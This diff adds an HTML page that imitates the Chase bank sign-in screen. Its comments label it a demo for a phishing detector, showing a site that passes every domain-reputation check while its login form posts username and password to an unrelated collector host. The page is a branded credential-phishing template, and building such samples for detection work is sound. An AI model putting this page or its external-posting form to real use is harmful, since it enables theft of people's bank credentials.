@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Chase - Sign in</title>
+<!--
+  Demo simulation only. This page is the point of the whole exercise: every
+  Tier 1 domain signal comes back clean. HTTPS, a .com domain, registered
+  eleven years ago, not on any blocklist, and a domain the user has visited
+  before. Reputation-only tools have nothing to say about it.
+
+  What gives it away is on the page itself: it presents as Chase, and its
+  login form posts the credentials to a completely unrelated origin.
+-->
+<meta name="demo-hostname" content="chase-account-services.com">
+<meta name="demo-https" content="true">
+<meta name="demo-domain-age-days" content="4015">
+<meta name="demo-blocklist-hit" content="false">
+<meta name="demo-arrived-via-link" content="false">
+<meta name="demo-first-visit" content="false">
+<style>
+  body { font-family: -apple-system, Arial, sans-serif; background: #f4f6f9; margin: 0; padding: 0; }
+  .header { background: #117ACA; color: white; padding: 18px 32px; font-size: 20px; font-weight: 600; }
+  .card { max-width: 380px; margin: 80px auto; background: white; padding: 32px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); }
+  label { display: block; font-size: 13px; margin: 14px 0 6px; color: #333; }
+  input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+  button { margin-top: 20px; width: 100%; padding: 11px; background: #117ACA; color: white; border: none; border-radius: 6px; font-size: 15px; cursor: pointer; }
+  .note { max-width: 420px; margin: 0 auto; text-align: center; color: #888; font-size: 12px; line-height: 1.5; }
+</style>
+</head>
+<body>
+  <div class="header">Chase</div>
+  <div class="card">
+    <h2 style="margin-top:0;">Sign in to your account</h2>
+    <p style="font-size:13px;color:#555;">Access your accounts, cards and statements.</p>
+    <!-- The tell: credentials are posted to an origin that has nothing to do
+         with this page or with Chase. -->
+    <form action="https://collector.credential-relay.workers.dev/submit" method="POST">
+      <label for="user">Username</label>
+      <input id="user" type="text" autocomplete="username">
+      <label for="pass">Password</label>
+      <input id="pass" type="password" autocomplete="current-password">
+      <button type="submit">Sign in</button>
+    </form>
+  </div>
+  <p class="note">
+    Demo page &mdash; every domain-level check passes: HTTPS, a plain <code>.com</code>,
+    registered 11 years ago, no blocklist hit, not a first visit. Only the page
+    itself gives it away. Click into the password field.
+  </p>
+</body>
+</html>
